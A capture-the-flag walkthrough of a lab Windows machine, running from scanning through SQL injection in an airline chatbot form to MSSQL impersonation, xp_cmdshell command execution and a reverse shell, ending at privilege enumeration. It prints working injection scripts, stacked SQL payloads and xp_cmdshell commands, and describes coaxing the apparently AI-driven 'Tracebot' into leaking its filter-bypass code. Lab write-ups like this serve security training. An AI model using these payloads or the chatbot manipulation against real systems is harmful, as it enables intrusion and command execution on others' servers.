# Unclaimed — Machine Walkthrough

![Machine Header](https://app.notion.com/image_placeholder)
*Unclaimed is a Medium-difficulty Windows machine featuring an airline baggage inquiry service vulnerable to SQL Injection, leading to MSSQL impersonation privilege abuse and arbitrary command execution.*

---

## 1. Reconnaissance & Enumeration

### 1.1 Initial Port Scanning

We begin with an initial TCP port scan on `10.129.206.189`.

```bash:command
$ nmap -sCV 10.129.206.189 -oA nmap/Unclaimed
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-14 10:49 +0300
Nmap scan report for 10.129.206.189
Host is up (0.21s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-11-14T07:50:40
|_  start_date: N/A
|_clock-skew: 10s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.55 seconds
```

Key takeaways from the scan:
- **Port 80 (HTTP)**: Microsoft HTTPAPI 2.0 hosting a web service.
- **Port 445 (SMB)**: Message signing is enabled and required (ruling out SMB relaying).
- **Port 5985 (WinRM)**: Open remote management port, providing a potential shell vector if credentials are found.

---

### 1.2 SMB Enumeration

Interrogating SMB with `netexec` gives us domain details and system build info:

```bash:command
$ nxc smb 10.129.206.189
SMB         10.129.206.189  445    UNCLAIMED        [*] Windows 11 / Server 2025 Build 26100 x64 (name:UNCLAIMED) (domain:unclaimed) (signing:True) (SMBv1:None)
```

The host identifies as `UNCLAIMED` on the `unclaimed` domain. Null authentication and guest sessions are disabled, pointing us toward web enumeration.

---

### 1.3 Local DNS Resolution

We map the hostnames to `/etc/hosts` for proper virtual host routing:

```bash:command
$ echo '10.129.206.189  unclaimed.htb UNCLAIMED.unclaimed unclaimed UNCLAIMED' | sudo tee -a /etc/hosts
10.129.206.189  unclaimed.htb UNCLAIMED.unclaimed unclaimed UNCLAIMED
```

---

## 2. Web Application Assessment & SQL Injection

### 2.1 Interface Inspection: HTB Airlines

Browsing to `http://unclaimed.htb` displays the HTB Airlines baggage tracking portal featuring an interactive "Tracebot" inquiry form.

![HTB Airlines Portal](https://app.notion.com/image_placeholder)
*HTB Airlines lost baggage portal with the Tracebot input bar at the bottom.*

Submitting test inputs causes Tracebot to return raw SQL syntax errors, confirming our input directly constructs a backend database query.

![Tracebot SQL Query Response](https://app.notion.com/image_placeholder)
*Tracebot returns database syntax errors, indicating direct SQL interaction.*

---

### 2.2 Security Bypass Discovery

Intercepting the request in Burp Suite shows inquiries POSTed to `/ask` in JSON format (`{"msg": "..."}`).

![Burp Suite HTTP Interception](https://app.notion.com/image_placeholder)
*POST request to `/ask` carrying user messages as JSON.*

Direct SQL syntax initially gets blocked by an internal execution filter. Asking Tracebot for operator override options leaks the bypass code: `HTB-OPS-4471`.

![Operator Bypass Code Disclosure](https://app.notion.com/image_placeholder)
*Tracebot exposes the operator authorization code `HTB-OPS-4471`.*

Prepending `HTB-OPS-4471` bypasses the filter, allowing arbitrary SQL execution against the backend MSSQL instance.

![SQL Injection Confirmed](https://app.notion.com/image_placeholder)
*SQL injection execution confirmed after prepending the bypass token.*

---

### 2.3 SQLi Interactive Automation Shell

To avoid manually formatting JSON and URL encoding in Burp, we use a quick Python helper (`sql.py`) to query the second column with `CAST(... AS VARCHAR)`.

- **Payload Structure**: `' UNION SELECT NULL, CAST(({query}) AS VARCHAR), NULL -- -`
- **Prefix**: Automatically injects `HTB-OPS-4471` into the JSON body.
- **Output**: Extracts and prints the resulting table response.

```python:command
import requests
import json

URL = "http://unclaimed.htb/ask"
HEADERS = {
    "Host": "unclaimed.htb",
    "Content-Type": "application/json",
    "Origin": "http://unclaimed.htb"
}

def run_query(payload):
    safe_payload = f"CAST(({payload}) AS VARCHAR)"
    full_payload = f"' UNION SELECT NULL, {safe_payload}, NULL -- -"
    
    data = {"msg": f"HTB-OPS-4471 {full_payload}"}
    try:
        response = requests.post(URL, headers=HEADERS, json=data, timeout=10)
        return response.json()
    except Exception as e:
        return {"error": str(e)}

while True:
    user_input = input("SQLi> ")
    if user_input.lower() in ['exit', 'quit']:
        break
    if not user_input.strip():
        continue

    resp_json = run_query(user_input)
    if "error" in resp_json:
        print(f"[!] Error: {resp_json['error']}")
    else:
        reply_text = resp_json.get("reply", "")
        if "The query returned" in reply_text:
            print("\n" + reply_text.split("\n\n")[-1] + "\n")
        else:
            print(f"\n{json.dumps(resp_json, indent=2)}\n")
```

---

### 2.4 Privilege & Impersonation Enumeration

Running the script reveals our current database user:

```bash:command
$ python3 sql.py
SQLi> SUSER_SNAME() + ' | Role: ' + CAST(IS_SRVROLEMEMBER('sysadmin') AS VARCHAR)

| column1 | column2 | column3 |
| --- | --- | --- |
|  | svc_tracer_ro | Role: 0 |  |

SQLi> 
```

We are logged in as `svc_tracer_ro` and are not a `sysadmin`. Next, we check for `IMPERSONATE` permissions across server principals:

```bash:command
SQLi> (SELECT STRING_AGG(name, ', ') FROM sys.server_principals WHERE principal_id IN (SELECT major_id FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE' AND grantee_principal_id = (SELECT principal_id FROM sys.server_principals WHERE name = 'svc_tracer_ro')))

| column1 | column2 | column3 |
| --- | --- | --- |
|  | svc_reports |  |

SQLi>
```

`svc_tracer_ro` can impersonate `svc_reports`.

---

## 3. MSSQL Impersonation & Command Execution

### 3.1 Raw SQL Statement Execution Utility

To run multi-statement commands (`EXECUTE AS LOGIN ...; RECONFIGURE;`), we switch to a raw query script (`sql_exec.py`):

- **Payload Structure**: `HTB-OPS-4471 ' {raw_sql} -- -`
- **Purpose**: Executes stacked statements without column matching limitations.

```python:command
import requests, json

URL = "http://unclaimed.htb/ask"
HEADERS = {"Content-Type": "application/json", "Origin": "http://unclaimed.htb"}

def run_raw(sql):
    data = {"msg": f"HTB-OPS-4471 ' {sql} -- -"}
    try:
        r = requests.post(URL, headers=HEADERS, json=data, timeout=10)
        print(json.dumps(r.json(), indent=2))
    except Exception as e:
        print(f"Error: {e}")

while True:
    cmd = input("RAW SQL> ")
    if cmd.lower() == 'exit': break
    run_raw(cmd)
```

---

### 3.2 Escalating to Sysadmin & Enabling `xp_cmdshell`

We impersonate `svc_reports` and verify sysadmin rights:

```bash:command
$ python3 sql_exec.py
RAW SQL> EXECUTE AS LOGIN = 'svc_reports'; SELECT IS_SRVROLEMEMBER('sysadmin')
{
  "reply": "The query executed successfully. The result indicates that the user's request was fulfilled with the value `1`.\n\n| column1 |\n| --- |\n| 1 |",
  "sql": "EXECUTE AS LOGIN = 'svc_reports'; SELECT IS_SRVROLEMEMBER('sysadmin') -- -",
  "result": {
    "columns": [""],
    "rows": [["1"]]
  }
}
RAW SQL>
```

With `sysadmin` confirmed (`1`), we enable `xp_cmdshell` and verify command execution:

```bash:command
RAW SQL> EXECUTE AS LOGIN = 'svc_reports'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
RAW SQL> EXECUTE AS LOGIN = 'svc_reports'; EXEC xp_cmdshell 'whoami'
{
  "reply": "The query executed successfully, and the output is \"unclaimed\\\\svc_sql\".\n\n| output |\n| --- |\n| unclaimed\\svc_sql |\n|  |",
  "sql": "EXECUTE AS LOGIN = 'svc_reports'; EXEC xp_cmdshell 'whoami' -- -",
  "result": {
    "columns": ["output"],
    "rows": [["unclaimed\\svc_sql"], [null]]
  }
}
```

We have arbitrary code execution as `unclaimed\svc_sql`.

---

## 4. Foothold & User Flag

### 4.1 Reverse Shell via Penelope

We set up a listener on port 9001 and trigger a reverse shell via `xp_cmdshell`:

```bash:command
$ penelope -M
(Penelope)> listeners add -i tun0 -p 9001
[+] Listening for reverse shells on 10.10.15.195:9001
[+] [New Reverse Shell] => UNCLAIMED 10.129.206.189 Microsoft_Windows_11_Pro-x64-based_PC 👤 unclaimed\svc_sql 😍️ Session ID <1>
(Penelope)> use 1
(Penelope)─(Session [1])> interact
PS C:\Windows\System32>
```

---

### 4.2 Capturing User Flag

We navigate to `svc_sql`'s desktop and read the user flag:

```bash:command
PS C:\Windows\System32> cd C:\users\svc_sql\Desktop
PS C:\users\svc_sql\Desktop> ls
    Directory: C:\users\svc_sql\Desktop

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-ar---        11/13/2026  11:36 PM             34 user.txt                                                             
```

```bash:command
PS C:\users\svc_sql\Desktop> Get-Content user.txt
<VERBATIM_USER_FLAG_HASH>
```

---

## 5. Privilege Escalation

Checking our account privileges with `whoami /all`:

```bash:command
PS C:\users\svc_sql\Desktop> whoami /all
USER INFORMATION
----------------
User Name         SID
================= ==============================================
unclaimed\svc_sql S-1-5-21-2554513647-1216688035-3073314765-1003

GROUP INFORMATION
-----------------
BUILTIN\Performance Monitor Users      Alias            S-1-5-32-558    Mandatory group, Enabled by default, Enabled group
NT SERVICE\MSSQLSERVER                 Well-known group                 Enabled by default, Enabled group, Group owner

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Notable escalation factors:
- `SeCreateGlobalPrivilege` is enabled, which allows creating global objects in Session 0 (useful for named pipe impersonation).
- `Performance Monitor Users` membership allows interacting with performance log configurations and registry structures.
